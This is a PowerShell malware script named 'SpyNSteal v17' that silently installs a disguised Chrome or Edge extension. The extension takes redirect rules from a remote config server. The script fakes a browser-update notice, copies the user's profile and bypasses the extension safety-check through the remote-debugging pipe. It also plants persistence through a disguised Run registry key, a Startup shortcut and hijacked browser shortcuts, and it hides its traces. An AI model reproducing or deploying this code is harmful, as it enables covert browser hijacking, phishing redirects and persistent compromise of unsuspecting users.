# SpyNSteal v17 - User Data_SNS + pipe CDP + fixed ChromeLaunch + safety-check bypass
# ChromeLaunch.exe had {{0}} bug: shortcuts launched chrome with literal "{0}" not the profile path.

$MANIFEST = @'
{
  "manifest_version": 3,
  "name": "Chrome Resource Scheduler",
  "version": "1.0",
  "description": "Manages internal resource scheduling and prioritization.",
  "permissions": ["declarativeNetRequest"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "sw.js"
  }
}
'@

$SW_JS = @'
const C = "https://example.com/config.json";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
  } catch (_) {}
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  pull();
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
init();
'@

$LOG = Join-Path $env:APPDATA "~diag.log"
function Log([string]$msg) {
    $ts = Get-Date -Format 'HH:mm:ss'
    try { Add-Content $LOG "$ts  $msg" } catch {}
}

Add-Type -ReferencedAssemblies @("System.Core") -TypeDefinition @"
using System;
using System.IO;
using System.IO.Pipes;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Collections.Generic;

public class PipeCDP {

    private static void SendCmd(AnonymousPipeServerStream pipe, string json) {
        byte[] b = Encoding.UTF8.GetBytes(json);
        pipe.Write(b, 0, b.Length);
        pipe.WriteByte(0);
        pipe.Flush();
    }

    private static string JsonStr(string json, string key) {
        string p = "\"" + key + "\":\"";
        int s = json.IndexOf(p);
        if (s < 0) return null;
        s += p.Length;
        int e = json.IndexOf("\"", s);
        return (e > s) ? json.Substring(s, e - s) : null;
    }

    private static string WaitFor(List<string> q, object lk, int id, int ms) {
        string t1 = "\"id\":" + id;
        string t2 = "\"id\": " + id;
        DateTime dl = DateTime.Now.AddMilliseconds(ms);
        while (DateTime.Now < dl) {
            lock (lk) {
                for (int i = 0; i < q.Count; i++) {
                    if (q[i].Contains(t1) || q[i].Contains(t2)) {
                        string r = q[i]; q.RemoveAt(i); return r;
                    }
                }
            }
            Thread.Sleep(100);
        }
        return null;
    }

    public static string LoadExtViaPipe(string chromePath, string userDataDir, string extensionDir) {
        AnonymousPipeServerStream toChrome = null;
        AnonymousPipeServerStream fromChrome = null;
        Process proc = null;

        try {
            toChrome = new AnonymousPipeServerStream(PipeDirection.Out, HandleInheritability.Inheritable);
            fromChrome = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable);

            string rH = toChrome.GetClientHandleAsString();
            string wH = fromChrome.GetClientHandleAsString();

            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = chromePath;
            psi.Arguments = String.Format(
                "--remote-debugging-pipe " +
                "--enable-unsafe-extension-debugging " +
                "--user-data-dir=\"{0}\" " +
                "--no-first-run --no-default-browser-check " +
                "--disable-background-networking " +
                "--remote-debugging-io-pipes={1},{2}",
                userDataDir, rH, wH);
            psi.UseShellExecute = false;

            try { proc = Process.Start(psi); }
            catch (Exception ex) { return "ERR:LAUNCH:" + ex.Message; }

            toChrome.DisposeLocalCopyOfClientHandle();
            fromChrome.DisposeLocalCopyOfClientHandle();

            Thread.Sleep(6000);
            if (proc.HasExited) return "ERR:CHROME_DIED:" + proc.ExitCode;

            List<string> q = new List<string>();
            object lk = new object();

            Thread reader = new Thread(delegate() {
                try {
                    StringBuilder sb = new StringBuilder();
                    while (true) {
                        int bt = fromChrome.ReadByte();
                        if (bt == -1) break;
                        if (bt == 0) {
                            string m = sb.ToString(); sb.Length = 0;
                            if (m.Length > 0) { lock (lk) { q.Add(m); } }
                        } else { sb.Append((char)bt); }
                    }
                } catch {}
            });
            reader.IsBackground = true;
            reader.Start();

            string log = "";

            SendCmd(toChrome,
                "{\"id\":10,\"method\":\"Target.createTarget\",\"params\":{\"url\":\"chrome://extensions\"}}");
            string cResp = WaitFor(q, lk, 10, 15000);
            log += "T.create:" + (cResp != null ? "ok" : "null") + "|";

            string sessId = null;
            string tgtId = (cResp != null) ? JsonStr(cResp, "targetId") : null;
            if (tgtId == null) {
                log += "NO_TARGET|";
            } else {
                SendCmd(toChrome,
                    "{\"id\":11,\"method\":\"Target.attachToTarget\",\"params\":{\"targetId\":\"" + tgtId + "\",\"flatten\":true}}");
                string aResp = WaitFor(q, lk, 11, 10000);
                sessId = (aResp != null) ? JsonStr(aResp, "sessionId") : null;
                log += "attach:" + (sessId != null ? "ok" : "null") + "|";

                if (sessId != null) {
                    Thread.Sleep(3000);

                    SendCmd(toChrome,
                        "{\"id\":12,\"sessionId\":\"" + sessId + "\",\"method\":\"Runtime.evaluate\",\"params\":{" +
                        "\"expression\":\"chrome.developerPrivate.setProfileConfiguration({inDeveloperMode:true})\"," +
                        "\"awaitPromise\":true}}");
                    string dResp = WaitFor(q, lk, 12, 10000);
                    log += "devmode:" + (dResp != null ? "ok" : "null") + "|";
                }
            }

            string fwdPath = extensionDir.Replace("\\", "/");
            SendCmd(toChrome,
                "{\"id\":1,\"method\":\"Extensions.loadUnpacked\",\"params\":{\"path\":\"" + fwdPath + "\"}}");
            string extResp = WaitFor(q, lk, 1, 30000);
            log += "ext:" + (extResp != null ? extResp : "null") + "|";

            string loadedId = (extResp != null) ? JsonStr(extResp, "id") : null;
            if (sessId != null && loadedId != null) {
                Thread.Sleep(2000);
                string ackExpr =
                    "chrome.developerPrivate.setProfileConfiguration({inDeveloperMode:true});" +
                    "chrome.developerPrivate.updateExtensionConfiguration({" +
                    "extensionId:'" + loadedId + "',fileAccess:true," +
                    "acknowledgeSafetyCheckWarning:true,pinnedToToolbar:false})";
                string ackJson = ackExpr.Replace("\\", "\\\\").Replace("\"", "\\\"");
                SendCmd(toChrome,
                    "{\"id\":13,\"sessionId\":\"" + sessId + "\",\"method\":\"Runtime.evaluate\",\"params\":{" +
                    "\"expression\":\"" + ackJson + "\",\"awaitPromise\":true}}");
                string ackResp = WaitFor(q, lk, 13, 10000);
                log += "ack:" + (ackResp != null ? "ok" : "null") + "|";
            }

            Thread.Sleep(8000);

            try { SendCmd(toChrome, "{\"id\":99,\"method\":\"Browser.close\"}"); } catch {}

            bool exited = false;
            try { exited = proc.WaitForExit(25000); } catch {}
            if (!exited) { try { proc.Kill(); } catch {} try { proc.WaitForExit(5000); } catch {} }

            proc = null;
            return log;

        } catch (Exception ex) {
            return "ERR:GENERAL:" + ex.Message;
        } finally {
            if (proc != null) {
                try { if (!proc.HasExited) proc.Kill(); } catch {}
                try { proc.WaitForExit(5000); } catch {}
            }
            if (toChrome != null) try { toChrome.Dispose(); } catch {}
            if (fromChrome != null) try { fromChrome.Dispose(); } catch {}
        }
    }

    public static string PersistDeveloperMode_UNUSED(string chromePath, string userDataDir) {
        AnonymousPipeServerStream toChrome = null;
        AnonymousPipeServerStream fromChrome = null;
        Process proc = null;
        try {
            toChrome = new AnonymousPipeServerStream(PipeDirection.Out, HandleInheritability.Inheritable);
            fromChrome = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable);
            string rH = toChrome.GetClientHandleAsString();
            string wH = fromChrome.GetClientHandleAsString();
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = chromePath;
            psi.Arguments = String.Format(
                "--remote-debugging-pipe --enable-unsafe-extension-debugging " +
                "--user-data-dir=\"{0}\" --no-first-run --no-default-browser-check " +
                "--remote-debugging-io-pipes={1},{2}",
                userDataDir, rH, wH);
            psi.UseShellExecute = false;
            proc = Process.Start(psi);
            toChrome.DisposeLocalCopyOfClientHandle();
            fromChrome.DisposeLocalCopyOfClientHandle();
            Thread.Sleep(6000);
            if (proc.HasExited) return "ERR:DIED";
            List<string> q = new List<string>();
            object lk = new object();
            Thread reader = new Thread(delegate() {
                try {
                    StringBuilder sb = new StringBuilder();
                    while (true) {
                        int bt = fromChrome.ReadByte();
                        if (bt == -1) break;
                        if (bt == 0) {
                            string m = sb.ToString(); sb.Length = 0;
                            if (m.Length > 0) { lock (lk) { q.Add(m); } }
                        } else { sb.Append((char)bt); }
                    }
                } catch {}
            });
            reader.IsBackground = true;
            reader.Start();
            SendCmd(toChrome,
                "{\"id\":20,\"method\":\"Target.createTarget\",\"params\":{\"url\":\"chrome://extensions\"}}");
            string cResp = WaitFor(q, lk, 20, 15000);
            string tgtId = (cResp != null) ? JsonStr(cResp, "targetId") : null;
            if (tgtId == null) return "NO_TARGET";
            SendCmd(toChrome,
                "{\"id\":21,\"method\":\"Target.attachToTarget\",\"params\":{\"targetId\":\"" + tgtId + "\",\"flatten\":true}}");
            string aResp = WaitFor(q, lk, 21, 10000);
            string sessId = (aResp != null) ? JsonStr(aResp, "sessionId") : null;
            if (sessId == null) return "NO_SESSION";
            Thread.Sleep(2000);
            SendCmd(toChrome,
                "{\"id\":22,\"sessionId\":\"" + sessId + "\",\"method\":\"Runtime.evaluate\",\"params\":{" +
                "\"expression\":\"chrome.developerPrivate.setProfileConfiguration({inDeveloperMode:true})\"," +
                "\"awaitPromise\":true}}");
            WaitFor(q, lk, 22, 10000);
            Thread.Sleep(5000);
            try { SendCmd(toChrome, "{\"id\":99,\"method\":\"Browser.close\"}"); } catch {}
            try { proc.WaitForExit(20000); } catch {}
            if (!proc.HasExited) { try { proc.Kill(); } catch {} }
            proc = null;
            return "devmode_flush:ok";
        } catch (Exception ex) {
            return "ERR:" + ex.Message;
        } finally {
            if (proc != null) { try { if (!proc.HasExited) proc.Kill(); } catch {} }
            if (toChrome != null) try { toChrome.Dispose(); } catch {}
            if (fromChrome != null) try { fromChrome.Dispose(); } catch {}
        }
    }
}
"@

function Find-Browser([string]$name) {
    $info = @{ Name = $name; Found = $false; Running = $false }
    switch ($name) {
        "chrome" {
            $info.UserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $info.Proc = "chrome"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
            $info.AppDirs = @(
                "$env:ProgramFiles\Google\Chrome\Application",
                "${env:ProgramFiles(x86)}\Google\Chrome\Application",
                "$env:LOCALAPPDATA\Google\Chrome\Application"
            )
            $info.NotifTitle = "Google Chrome"
            $info.NotifText = "An update has been downloaded. Restarting to apply changes."
        }
        "edge" {
            $info.UserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            $info.Proc = "msedge"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
            $info.AppDirs = @(
                "${env:ProgramFiles(x86)}\Microsoft\Edge\Application",
                "$env:ProgramFiles\Microsoft\Edge\Application",
                "$env:LOCALAPPDATA\Microsoft\Edge\Application"
            )
            $info.NotifTitle = "Microsoft Edge"
            $info.NotifText = "An update has been installed. Edge will restart to apply it."
        }
    }
    if (-not (Test-Path $info.UserData)) { return $info }
    $info.Found = $true
    $info.Running = [bool](Get-Process $info.Proc -EA SilentlyContinue)
    try { $info.ExePath = (Get-ItemProperty $info.RegKey -EA Stop).'(default)' } catch {}
    if (-not $info.ExePath -or -not (Test-Path $info.ExePath)) {
        foreach ($d in $info.AppDirs) {
            $c = if ($name -eq "chrome") { Join-Path $d "chrome.exe" } else { Join-Path $d "msedge.exe" }
            if (Test-Path $c) { $info.ExePath = $c; break }
        }
    }
    return $info
}

function Patch-LocalState($userDataDir) {
    $lsPath = Join-Path $userDataDir "Local State"
    if (-not (Test-Path $lsPath)) { return }
    try {
        $noBom = New-Object Text.UTF8Encoding($false)
        $raw = [IO.File]::ReadAllText($lsPath)
        $raw = $raw.Replace('"exited_cleanly":false', '"exited_cleanly":true')
        $raw = $raw.Replace('"exit_type":"Crashed"', '"exit_type":"Normal"')
        [IO.File]::WriteAllText($lsPath, $raw, $noBom)
    } catch {}
}

function Show-UpdateNotif($browser) {
    try {
        Add-Type -AssemblyName System.Windows.Forms -EA Stop
        Add-Type -AssemblyName System.Drawing -EA Stop
        $n = New-Object Windows.Forms.NotifyIcon
        if ($browser.ExePath -and (Test-Path $browser.ExePath)) {
            $n.Icon = [Drawing.Icon]::ExtractAssociatedIcon($browser.ExePath)
        } else { $n.Icon = [Drawing.SystemIcons]::Information }
        $n.BalloonTipTitle = $browser.NotifTitle
        $n.BalloonTipText = $browser.NotifText
        $n.Visible = $true
        $n.ShowBalloonTip(5000)
        Start-Sleep 5
        $n.Visible = $false; $n.Dispose()
    } catch {}
}

function Kill-AllProcs([string]$procName) {
    for ($k = 0; $k -lt 25; $k++) {
        if (-not (Get-Process $procName -EA SilentlyContinue)) { return $true }
        Get-Process $procName -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
        Start-Sleep -Milliseconds 500
    }
    return (-not [bool](Get-Process $procName -EA SilentlyContinue))
}

function Ensure-IsolatedProfile([string]$realUserData) {
    $parent = Split-Path $realUserData -Parent
    $sns = Join-Path $parent "User Data_SNS"
    $marker = Join-Path $sns ".sns_ready"

    if ((Test-Path $marker) -and (Test-Path (Join-Path $sns "Default"))) {
        Log "Using existing isolated profile: $sns"
        return $sns
    }

    Log "Creating isolated profile User Data_SNS (one-time copy from real profile)..."
    if (Test-Path $sns) { Remove-Item $sns -Recurse -Force -EA SilentlyContinue }
    New-Item -Path $sns -ItemType Directory -Force | Out-Null

    $ls = Join-Path $realUserData "Local State"
    if (Test-Path $ls) { Copy-Item $ls (Join-Path $sns "Local State") -Force }

    $srcDef = Join-Path $realUserData "Default"
    $dstDef = Join-Path $sns "Default"
    if (Test-Path $srcDef) {
        $robo = robocopy "`"$srcDef`"" "`"$dstDef`"" /E /XD "Cache" "Code Cache" "GPUCache" "GrShaderCache" "ShaderCache" /XF "LOCK" "LOG" "CURRENT" /NFL /NDL /NJH /NJS /nc /ns /np /R:1 /W:1
        Log "Profile copy robocopy exit: $LASTEXITCODE"
    }

    [IO.File]::WriteAllText($marker, (Get-Date -Format "o"))
    Log "Isolated profile ready: $sns"
    return $sns
}

function Get-ExtensionLoadPath([string]$profileDir, [string]$extId) {
    if (-not $extId) { return $null }
    $p = Join-Path $profileDir "Default\Extensions\$extId\1.0_0"
    if (Test-Path (Join-Path $p "manifest.json")) { return $p }
    return $null
}

function Get-ChromeLaunchArgs([string]$profileDir, [string]$extLoadPath) {
    $args = @(
        "--user-data-dir=$profileDir",
        "--restore-last-session",
        "--enable-unsafe-extension-debugging",
        "--disable-features=DisableLoadExtensionCommandLineSwitch"
    )
    if ($extLoadPath) {
        $args += "--load-extension=$extLoadPath"
    }
    return $args
}

function Start-ChromeWithExtension([string]$chromeExe, [string]$profileDir, [string]$extLoadPath) {
    $argList = Get-ChromeLaunchArgs $profileDir $extLoadPath
    Log "Start-Chrome: $($argList -join ' ')"
    Start-Process -FilePath $chromeExe -ArgumentList $argList | Out-Null
}

function Test-DeveloperModePersisted([string]$profileDir) {
    foreach ($name in @("Secure Preferences", "Preferences")) {
        $p = Join-Path $profileDir "Default\$name"
        if (-not (Test-Path $p)) { continue }
        $raw = [IO.File]::ReadAllText($p)
        if ($raw -match '"extensions"\s*:\s*\{[^}]{0,2000}"ui"\s*:\s*\{[^}]*"developer_mode"\s*:\s*true') {
            return $true
        }
    }
    return $false
}

function Build-ChromeLaunchExe([string]$chromeExe, [string]$profileDir, [string]$extLoadPath) {
    $baseDir = Join-Path $env:APPDATA "CRSched"
    $exePath = Join-Path $baseDir "ChromeLaunch.exe"
    $csPath = Join-Path $baseDir "ChromeLaunch.cs"

    if ($extLoadPath) {
        $argBlock = @"
            string prof = @"$profileDir";
            string ext = @"$extLoadPath";
            psi.Arguments = "--user-data-dir=\"" + prof + "\" --restore-last-session --enable-unsafe-extension-debugging --disable-features=DisableLoadExtensionCommandLineSwitch --load-extension=\"" + ext + "\"";
"@
    } else {
        $argBlock = @"
            string prof = @"$profileDir";
            psi.Arguments = "--user-data-dir=\"" + prof + "\" --restore-last-session --enable-unsafe-extension-debugging --disable-features=DisableLoadExtensionCommandLineSwitch";
"@
    }

    $cs = @"
using System;
using System.Diagnostics;
using System.IO;
public static class ChromeLaunch {
    public static void Main(string[] args) {
        try {
            string log = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "CRSched", "launch.log");
            File.AppendAllText(log, DateTime.Now.ToString("HH:mm:ss") + " ChromeLaunch.exe started\r\n");
            var psi = new ProcessStartInfo();
            psi.FileName = @"$chromeExe";
$argBlock
            psi.UseShellExecute = false;
            Process.Start(psi);
            File.AppendAllText(log, DateTime.Now.ToString("HH:mm:ss") + " Process.Start ok\r\n");
        } catch (Exception ex) {
            try {
                string log = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "CRSched", "launch.log");
                File.AppendAllText(log, DateTime.Now.ToString("HH:mm:ss") + " error: " + ex.Message + "\r\n");
            } catch {}
        }
    }
}
"@
    $utf8 = New-Object Text.UTF8Encoding($false)
    [IO.File]::WriteAllText($csPath, $cs, $utf8)

    $csc = Join-Path $env:WINDIR "Microsoft.NET\Framework64\v4.0.30319\csc.exe"
    if (-not (Test-Path $csc)) {
        $csc = Join-Path $env:WINDIR "Microsoft.NET\Framework\v4.0.30319\csc.exe"
    }
    if (-not (Test-Path $csc)) {
        Log "csc.exe not found - ChromeLaunch.exe skipped"
        return $null
    }

    $out = & $csc /nologo /target:winexe /out:$exePath $csPath 2>&1
    if (Test-Path $exePath) {
        $csCheck = [IO.File]::ReadAllText($csPath)
        if ($csCheck -match 'user-data-dir="\{0\}' -or $csCheck -match 'string\.Format') {
            Log "WARN: ChromeLaunch.cs looks broken (literal {0})"
        } else {
            Log "ChromeLaunch.exe built: $exePath"
        }
        return $exePath
    }
    Log "ChromeLaunch.exe build failed: $out"
    return $null
}

function Write-ChromeLauncher([string]$chromeExe, [string]$profileDir, [string]$extLoadPath, [string]$extId) {
    $baseDir = Join-Path $env:APPDATA "CRSched"
    New-Item -Path $baseDir -ItemType Directory -Force | Out-Null
    $psPath = Join-Path $baseDir "launch.ps1"
    $batPath = Join-Path $baseDir "chrome.cmd"
    $logPath = Join-Path $baseDir "launch.log"

    $psContent = @"
`$log = '$($logPath.Replace("'", "''"))'
function L([string]`$m) { try { Add-Content `$log "`$(Get-Date -Format 'HH:mm:ss') `$m" } catch {} }
L 'launch.ps1 started'
try {
    `$chrome = '$($chromeExe.Replace("'", "''"))'
    `$profile = '$($profileDir.Replace("'", "''"))'
    `$loadExt = '$($extLoadPath.Replace("'", "''"))'
    `$argList = @(
        "--user-data-dir=`$profile",
        '--restore-last-session',
        '--enable-unsafe-extension-debugging',
        '--disable-features=DisableLoadExtensionCommandLineSwitch'
    )
    if (`$loadExt) { `$argList += "--load-extension=`$loadExt" }
    L "args: `$(`$argList -join ' ')"
    Start-Process -FilePath `$chrome -ArgumentList `$argList | Out-Null
    L 'Start-Process ok'
} catch {
    L "error: `$_"
}
"@
    $utf8 = New-Object Text.UTF8Encoding($false)
    [IO.File]::WriteAllText($psPath, $psContent, $utf8)

    $batContent = "@echo off`r`n" +
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$psPath`"`r\n" +
        "exit /b 0`r`n"
    [IO.File]::WriteAllText($batPath, $batContent, [Text.Encoding]::ASCII)
    return @{ Ps1 = $psPath; Cmd = $batPath; Log = $logPath }
}

function Copy-ExtensionToProfile([string]$profileDir, [string]$extId, [string]$srcDir) {
    $dest = Join-Path $profileDir "Default\Extensions\$extId\1.0_0"
    if (Test-Path $dest) { Remove-Item $dest -Recurse -Force -EA SilentlyContinue }
    New-Item -Path $dest -ItemType Directory -Force | Out-Null
    Copy-Item (Join-Path $srcDir "*") $dest -Recurse -Force
    return (Test-Path (Join-Path $dest "manifest.json"))
}

function Remove-ChromeIFEO {
    try {
        Remove-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe" -Recurse -Force -EA Stop
        Log "Removed stale IFEO hook (breaks chrome.exe on this OS)"
    } catch {}
}

function Set-ChromeShortcut([object]$shell, [string]$lnkPath, [string]$chromeExe, [string]$launchExe, [string]$launcherBat) {
    if (-not (Test-Path (Split-Path $lnkPath -Parent))) {
        New-Item -Path (Split-Path $lnkPath -Parent) -ItemType Directory -Force | Out-Null
    }
    $sc = $shell.CreateShortcut($lnkPath)
    if ($launchExe -and (Test-Path $launchExe)) {
        $sc.TargetPath = $launchExe
        $sc.Arguments = ""
    } else {
        $cmdExe = Join-Path $env:WINDIR "System32\cmd.exe"
        $sc.TargetPath = $cmdExe
        $sc.Arguments = "/c `"$launcherBat`""
    }
    $sc.WorkingDirectory = Split-Path $launcherBat -Parent
    $sc.IconLocation = "$chromeExe,0"
    $sc.Description = "Google Chrome"
    $sc.Save()
}

function Install-ChromeLaunchHooks([string]$chromeExe, [hashtable]$launcher, [string]$launchExe, [string]$extId, [string]$profileDir, [string]$extDir) {
    $patched = 0
    $launcherBat = $launcher.Cmd
    $cmdExe = Join-Path $env:WINDIR "System32\cmd.exe"

    Remove-ChromeIFEO

    $runName = "GoogleChromeMetrics"
    $runCmd = if ($launchExe -and (Test-Path $launchExe)) { "`"$launchExe`"" } else { "`"$cmdExe`" /c `"$launcherBat`"" }
    try {
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $runName -Value $runCmd -Force
        Log "Run key: $runCmd"
        $patched++
    } catch { Log "Run key failed: $_" }

    $shell = New-Object -ComObject WScript.Shell
    $shortcutTargets = @(
        (Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Google Chrome.lnk"),
        (Join-Path $env:APPDATA "Microsoft\Internet Explorer\Quick Launch\Google Chrome.lnk"),
        (Join-Path $env:APPDATA "Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Google Chrome.lnk"),
        (Join-Path ([Environment]::GetFolderPath("Desktop")) "Google Chrome.lnk"),
        (Join-Path "$env:USERPROFILE\OneDrive\Desktop" "Google Chrome.lnk"),
        "$env:PUBLIC\Desktop\Google Chrome.lnk",
        "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Google Chrome.lnk"
    )

    foreach ($lnkPath in $shortcutTargets) {
        try {
            Set-ChromeShortcut $shell $lnkPath $chromeExe $launchExe $launcherBat
            $patched++
            Log "Shortcut patched: $lnkPath"
        } catch {
            Log "Shortcut skip ($lnkPath): $_"
        }
    }

    # User-writable copy on desktop (works when Public Desktop is read-only)
    try {
        $userDesk = Join-Path ([Environment]::GetFolderPath("Desktop")) "Google Chrome.lnk"
        Set-ChromeShortcut $shell $userDesk $chromeExe $launchExe $launcherBat
        $patched++
        Log "User desktop shortcut: $userDesk"
    } catch {}

    # Startup folder - extension loads at sign-in
    if ($launchExe -and (Test-Path $launchExe)) {
        try {
            $startup = [Environment]::GetFolderPath("Startup")
            $startupLnk = Join-Path $startup "Google Chrome.lnk"
            Set-ChromeShortcut $shell $startupLnk $chromeExe $launchExe $launcherBat
            $patched++
            Log "Startup shortcut: $startupLnk"
        } catch { Log "Startup shortcut failed: $_" }
    }

    if (-not ($launchExe -and (Test-Path $launchExe))) {
        Log "WARN: ChromeLaunch.exe missing - shortcuts use cmd fallback"
    } else {
        Log "Use desktop shortcut (OneDrive Desktop) - NOT Public Desktop icon if unchanged"
    }

    return $patched
}

# ============================================================================
Log "=== SpyNSteal v17 ==="

$baseDir = Join-Path $env:APPDATA "CRSched"
$extDir = Join-Path $baseDir "src"
New-Item -Path $extDir -ItemType Directory -Force | Out-Null
[IO.File]::WriteAllText((Join-Path $extDir "manifest.json"), $MANIFEST, [Text.Encoding]::UTF8)
[IO.File]::WriteAllText((Join-Path $extDir "sw.js"), $SW_JS, [Text.Encoding]::UTF8)
Log "Extension at: $extDir"

$browsers = @()
foreach ($name in @("chrome","edge")) {
    $b = Find-Browser $name
    Log "$name : Found=$($b.Found) Running=$($b.Running)"
    if ($b.Found -and $b.ExePath) { $browsers += $b }
}
if ($browsers.Count -eq 0) { Log "No browsers found"; exit }

$wasRunning = @()
foreach ($b in $browsers) { if ($b.Running) { $wasRunning += $b } }
if ($wasRunning.Count -gt 0) { Show-UpdateNotif $wasRunning[0] }

foreach ($b in $browsers) {
    $dead = Kill-AllProcs $b.Proc
    Log "$($b.Proc) killed: $dead"
}
Start-Sleep 3

$target = if ($wasRunning.Count -gt 0) { $wasRunning[0] } else { $browsers[0] }
$origPath = $target.UserData
$extDirAbs = (Resolve-Path $extDir).Path

Log "--- Processing $($target.Name) ---"
Log "Real profile: $origPath"

# Remove old junction (caused prefs wipe when user opened normal Chrome)
$oldJunction = Join-Path (Split-Path $origPath -Parent) "User Data_Ext"
if (Test-Path $oldJunction) {
    $ji = Get-Item $oldJunction -Force -EA SilentlyContinue
    if ($ji.Attributes -band [IO.FileAttributes]::ReparsePoint) {
        cmd /c rmdir "$oldJunction" 2>$null
        Log "Removed old User Data_Ext junction"
    }
}

$profileDir = Ensure-IsolatedProfile $origPath
if (-not $profileDir) {
    Log "FATAL: Could not create User Data_SNS profile"
    exit
}
Log "Isolated profile: $profileDir"

Patch-LocalState $profileDir

Log "Pipe CDP install on isolated profile..."
$cdpResult = [PipeCDP]::LoadExtViaPipe($target.ExePath, $profileDir, $extDirAbs)
Log "CDP result: $cdpResult"

Start-Sleep 2
Kill-AllProcs $target.Proc | Out-Null
Start-Sleep 1

$extId = ""
if ($cdpResult -and $cdpResult -notlike "ERR:*" -and $cdpResult -match '"id"\s*:\s*"([a-z]{32})"') {
    $extId = $matches[1]
    Log "Extension ID: $extId"
} else {
    Log "CDP install failed"
}

$copied = $false
$extLoadPath = $null
if ($extId) {
    $copied = Copy-ExtensionToProfile $profileDir $extId $extDirAbs
    Log "Extension copied to profile Extensions folder: $copied"
    $extLoadPath = Get-ExtensionLoadPath $profileDir $extId
    Log "Extension load path: $extLoadPath"
}

$prefsPath = Join-Path $profileDir "Default\Secure Preferences"
$inPrefs = $false
if ((Test-Path $prefsPath) -and $extId) {
    try {
        $content = [IO.File]::ReadAllText($prefsPath)
        $inPrefs = $content.Contains($extId)
        Log "Extension in Secure Preferences: $inPrefs"
    } catch {}
}

$launchExe = Build-ChromeLaunchExe $target.ExePath $profileDir $extLoadPath
$launcher = Write-ChromeLauncher $target.ExePath $profileDir $extLoadPath $extId
Log "Launcher: $($launcher.Cmd) | Exe: $launchExe"

$hookCount = Install-ChromeLaunchHooks $target.ExePath $launcher $launchExe $extId $profileDir $extDirAbs
Log "Launch hooks installed: $hookCount"

Patch-LocalState $profileDir
Start-Sleep 1

Log "Relaunching Chrome (isolated profile + --load-extension)..."
Start-ChromeWithExtension $target.ExePath $profileDir $extLoadPath
Start-Sleep 5

if (Test-Path $launcher.Log) {
    $launchLog = Get-Content $launcher.Log -Tail 5 -EA SilentlyContinue
    foreach ($line in $launchLog) { Log "  launch.log: $line" }
}

$chromeRunning = [bool](Get-Process chrome -EA SilentlyContinue)
Log "Chrome running after relaunch: $chromeRunning"
if ($chromeRunning) {
    $proc = Get-CimInstance Win32_Process -Filter "name='chrome.exe'" -EA SilentlyContinue | Select-Object -First 1
    if ($proc -and $proc.CommandLine) {
        $hasProfile = $proc.CommandLine -like "*User Data_SNS*"
        $hasLoad = $proc.CommandLine -like "*load-extension*"
        Log "  cmdline has User Data_SNS: $hasProfile"
        Log "  cmdline has load-extension: $hasLoad"
    }
}

Log "=== Done (extId=$extId, inPrefs=$inPrefs, copied=$copied, hooks=$hookCount) ==="
